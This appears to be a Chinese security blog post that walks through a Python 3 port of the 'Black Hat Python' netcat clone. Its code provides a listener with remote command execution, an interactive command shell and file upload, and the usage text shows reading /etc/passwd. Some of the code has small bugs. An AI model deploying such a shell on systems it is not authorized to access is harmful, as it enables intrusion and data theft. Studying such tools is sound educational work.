@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"aqyoung.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="关于网络编程之编写一款属于自己的netcat">
+<meta name="keywords" content="network">
+<meta property="og:type" content="article">
+<meta property="og:title" content="socket之编写netcat（python3）">
+<meta property="og:url" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;2020&#x2F;04&#x2F;30&#x2F;netcat1&#x2F;index.html">
+<meta property="og:site_name" content="AqYoung">
+<meta property="og:description" content="关于网络编程之编写一款属于自己的netcat">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;netcat&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;netcat&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;netcat&#x2F;3.png">
+<meta property="og:updated_time" content="2020-04-30T18:03:56.105Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;netcat&#x2F;1.png">
+
+<link rel="canonical" href="https://aqyoung.github.io/2020/04/30/netcat1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>socket之编写netcat（python3） | AqYoung</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">AqYoung</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享渗透知识与技巧</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aqyoung.github.io/2020/04/30/netcat1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AqYoung">
+      <meta itemprop="description" content="努力将一切"Regular attacks"工程化！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AqYoung">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          socket之编写netcat（python3）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-30 23:30:26" itemprop="dateCreated datePublished" datetime="2020-04-30T23:30:26+08:00">2020-04-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-01 02:03:56" itemprop="dateModified" datetime="2020-05-01T02:03:56+08:00">2020-05-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/04/30/netcat1/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/04/30/netcat1/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>关于网络编程之编写一款属于自己的netcat<a id="more"></a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>netcat是个计算机网络公用程序，用来对网络连线TCP或者UDP进行读写。 netcat 在2001年insecure.org对nmap用户邮件列表举办的投票被推选为第二有用的网络保全工具。2003年投票结果是第四名；2006年的投票继续稳占同样第四名宝座。<br>在《Python黑帽子》这本书中是这样介绍的：他说聪明的系统管理员都会将他从系统中移除。但是却安装了python</p>
+</blockquote>
+<p>在书中他是采用Python2来编写的，我这里用Python3编写，并且做出一些解释。</p>
+<h1 id="编写netcat"><a href="#编写netcat" class="headerlink" title="编写netcat"></a>编写netcat</h1><p><strong>在创建主函数之前我们先做一些准备</strong></p>
+<pre><code>#导入一些库
+import sys
+import socket
+import getopt
+import threading
+import subprocess
+
+# 定义全局变量
+listen = False
+command = False
+upload = False
+execute = &quot;&quot;
+target = &quot;&quot;
+upload_destination = &quot;&quot;
+port = 0
+
+# 编写使用帮助
+def usage():
+print(&quot;MY NET TOOL&quot;)
+print(&quot;&quot;)
+print(&quot;Usage: netcat.py -t target_host -p port&quot;)
+print(&quot;-l --listen                                    - listen on [host]:[port] for&quot;)
+print(&quot;                                                 incoming connections&quot;)
+print(&quot;-e --execute=file_to_run                       - execute the given file upon&quot;)
+print(&quot;                                                 receiving a connection&quot;)
+print(&quot;-c --command                                   - initialize a command shell&quot;)
+print(&quot;-u --upload=destination                        - upon receiving connection upload a&quot;)
+print(&quot;                                                 file and write to [destination]&quot;)
+print(&quot;&quot;)
+print(&quot;&quot;)
+print(&quot;Examples:&quot;)
+print(&quot;netcat.py -t 192.168.0.1 -p 5555 -l -c&quot;)
+print(&quot;netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe&quot;)
+print(&quot;netcat.py -t 192.168.0.1 -p 5555 -l -e=\&quot;cat /etc/passwd\&quot;&quot;)
+print(&quot;echo &apos;ABCDEFGHI&apos; | ./netcat.py -t 192.168.11.12 -p 135&quot;)
+sys.exit(0)</code></pre><p>上面导入库、定义全局变量和使用帮助，还需要根据socket创建两个函数server_loop()和client_sender()</p>
+<h2 id="了解socket的调用流程"><a href="#了解socket的调用流程" class="headerlink" title="了解socket的调用流程"></a>了解socket的调用流程</h2><p>由于编写中只涉及到TCP C/S模式，所以下面只针对这种。</p>
+<p>套接字调用流程：</p>
+<p><img src="/images/netcat/1.png" alt=""></p>
+<p>通过上面的流程图相信你可以很好的了解socket的调用流程，在此基础上进行编写server端</p>
+<pre><code>def server_loop():
+    global target
+
+    # 如果没有定义目标，监听所有接口
+    if not len(target):
+        target = &quot;0.0.0.0&quot;
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 1
+    server.bind((target, port)) # 2
+    server.listen(5) # 3
+
+    while True:
+        client_socket, addr = server.accept() # 4
+        # 分拆一个线程处理新的客户端
+        client_thread = threading.Thread(target=client_handler, args=(client_socket,)) # 5
+        client_thread.start()</code></pre><p>在上面的1~4都是对应流程图中Server直到5中调用了client中的发送和接收。下面看一下client端</p>
+<pre><code>def client_sender(buffer):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # 连接到目标主机
+        client.connect((target, port))
+
+        if len(buffer):
+            client.send(buffer.encode()) 
+
+        while True:
+            # 等待数据回传
+            recv_len = 1
+            response = &quot;&quot;
+
+            while recv_len:
+                data = client.recv(4096).decode()
+                recv_len = len(data)
+                response += data
+
+                if recv_len &lt; 4096:
+                    break
+            print(response)
+            # 等待更多的输入
+            buffer = input(&quot;&quot;)
+            buffer += &quot;\n&quot;
+            # 发送出去
+            client.send(buffer.encode())
+
+    except:
+        print(&quot;[*] Exception! Exiting.&quot;)
+        # 关闭连接
+        client.close()</code></pre><p>客户端的编写也是根据流程图就可以了，要注意的是Python3中发送和接收数据需要进行编码和解码。</p>
+<h2 id="实现文件上传、命令执行、shell相关功能"><a href="#实现文件上传、命令执行、shell相关功能" class="headerlink" title="实现文件上传、命令执行、shell相关功能"></a>实现文件上传、命令执行、shell相关功能</h2><pre><code># 命令执行
+def run_command(command):
+    # 换行
+    command = command.rstrip()
+    # 运行命令并将输入返回
+
+    try:
+        output = subprocess.getoutput(command)
+
+    except:
+        output = &quot;Failed to execute command.\r\n&quot;
+
+    # 将输出发送
+    return output</code></pre><p>在output中用subprocess.getoutput()函数来获取我们输入的命令</p>
+<pre><code># 实现文件上传、命令执行、shell相关功能
+def client_handler(client_socket):
+    global upload
+    global execute
+    global command
+
+    # 1 检测上传文件
+    if len(upload_destination):
+        # 读取所有的字符并且写下目标
+        file_buffer = &quot;&quot;
+        # 持续读取直至没有符合数据
+        while True:
+            data = client_socket.recv(1024)
+            if not data:
+                break
+            else:
+                file_buffer += data
+
+        # 2 现在我们接收这些数据并将他们写出来
+        try:
+            file_descriptor = open(upload_destination, &quot;wb&quot;)
+            file_descriptor.write(file_buffer)
+            file_descriptor.close()
+
+            # 确定文件已经写出来
+            client_socket.send(&quot;Sucessfully saved file to {}\r\n&quot;.format(upload_destination).encode())
+
+        except:
+            client_socket.send(&quot;Failed to save file to {}\r\n&quot;.format(upload_destination).encode())
+
+    # 3 检查命令执行
+    if len(execute):
+        # 运行命令
+        output = run_command(execute)
+        client_socket.send(output.encode())
+
+    # 如果需要一个命令行shell，进入另外一个循环
+    if command:
+
+        while True:
+            # 跳出一个窗口
+            client_socket.send(&quot;&lt;NETCAT:#&gt;&quot;.encode())
+            # 接收文件知道发现换行符
+            cmd_buffer = &quot;&quot;
+
+            while &quot;\n&quot; not in cmd_buffer:
+                cmd_buffer += client_socket.recv(1024).decode()
+                # 返还命令输出
+                response = run_command(cmd_buffer)
+                # 返回响应数据
+                client_socket.send(response.encode())</code></pre><p>说明：</p>
+<pre><code>1、主要负责连接之后来接收文件的，这样我们就可以通过该工具进行上传和执行测试脚本了
+2、接收文件数据，web标识确保我们以二进制格式写入，并且保证数据完全接收
+3、直接调用run_command函数执行文件
+4、持续处理你输入的命令</code></pre><p>最后到了编写主函数的时候</p>
+<pre><code>def main():
+    # 定义一些全局变量
+    global listen, opts
+    global port
+    global execute
+    global command
+    global upload_destination
+    global target
+
+    if not len(sys.argv[1:]):
+        usage()
+
+    # 读取命令行选项
+    try:
+        opts, args = getopt.getopt(sys.argv[1:], &quot;hle:t:p:cu:&quot;,
+                                   [&quot;help&quot;, &quot;listen&quot;, &quot;execute&quot;, &quot;target&quot;, &quot;port&quot;,
+                                    &quot;command&quot;, &quot;upload&quot;])
+    except getopt.GetoptError as err:
+        print(str(err))
+        usage()
+
+    for o, a in opts:
+        if o in (&quot;-h&quot;, &quot;--help&quot;):
+            usage()
+        elif o in (&quot;-l&quot;, &quot;--listen&quot;):
+            listen = True
+        elif o in (&quot;-e&quot;, &quot;--execute&quot;):
+            execute = a
+        elif o in (&quot;-t&quot;, &quot;--target&quot;):
+            target = a
+        elif o in (&quot;-p&quot;, &quot;--port&quot;):
+            port = int(a)
+        elif o in (&quot;-c&quot;, &quot;--command&quot;):
+            command = True
+        elif o in (&quot;-u&quot;, &quot;--upload&quot;):
+            upload_destination = a
+        else:
+            assert False, &quot;Unhandled Option&quot;
+
+    # 判断我们是监听还是仅从标准输入发送数据(这里相当于：client端)
+    if not listen and len(target) and port &gt; 0:
+        # 从命令行读取内存数据
+        # 这里将阻塞
+        buffer = sys.stdin.read()
+
+        # 发送数据
+        client_sender(buffer)
+
+    # 我们开始监听并准备上传文件、执行命令
+    # 放置一个反弹shell
+    # 取决于上面的命令行选项(这里相当于：server端)
+    if listen:
+        server_loop()
+
+
+if __name__ == &apos;__main__&apos;:
+    main()</code></pre><p>在定义一些全局变量之后，直接判断是否输入参数，如果没有则返回帮助</p>
+<pre><code>这里sys.argv[1:]表示的第一个参数之后    
+#例如：Python3 netcat.py -t target_host -p port
+那么sys.argv[1:]检测的是netcat.py 之后有没有参数(-t、-p)</code></pre><p>读取命令行选项</p>
+<pre><code>getopt.getopt(args, options[, long_options]
+# option 有&quot;：&quot;表示后面必须附加参数
+# 如 hlc都可以不需要附加参数，其他则需要附加</code></pre><p>之后就是判断有没有参数和调用之前的函数来执行了</p>
+<p>运行效果：</p>
+<p><img src="/images/netcat/2.png" alt=""></p>
+<p><img src="/images/netcat/3.png" alt=""></p>
+<p>Windows中使用CTRL-Z、Linux则使用CTRL-D</p>
+<p>参考:《Python黑帽子》</p>
+<hr>
+<p><strong>声明：</strong></p>
+<ul>
+<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>AqYoung
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://aqyoung.github.io/2020/04/30/netcat1/" title="socket之编写netcat（python3）">https://aqyoung.github.io/2020/04/30/netcat1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/network/" rel="tag"># network</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/30/%E6%83%B3%E6%89%B9%E9%87%8F%E5%88%B7%E6%B4%9E%EF%BC%8C%E7%9C%8B%E4%B8%80%E4%B8%8BPOC%E6%80%8E%E4%B9%88%E7%BC%96%E5%86%99/" rel="prev" title="想批量刷洞？看一下POC怎么编写">
+      <i class="fa fa-chevron-left"></i> 想批量刷洞？看一下POC怎么编写
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编写netcat"><span class="nav-number">2.</span> <span class="nav-text">编写netcat</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#了解socket的调用流程"><span class="nav-number">2.1.</span> <span class="nav-text">了解socket的调用流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现文件上传、命令执行、shell相关功能"><span class="nav-number">2.2.</span> <span class="nav-text">实现文件上传、命令执行、shell相关功能</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AqYoung"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">AqYoung</p>
+  <div class="site-description" itemprop="description">努力将一切"Regular attacks"工程化！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AqYoung</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'QWm74uHDCgmhInHfKwyFBod1-gzGzoHsz',
+      appKey     : '1ktt74cyVPPjTy4P28nMIH2V',
+      placeholder: "Just go go （记得在上面留下昵称和邮箱，方便回复！）",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '5' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
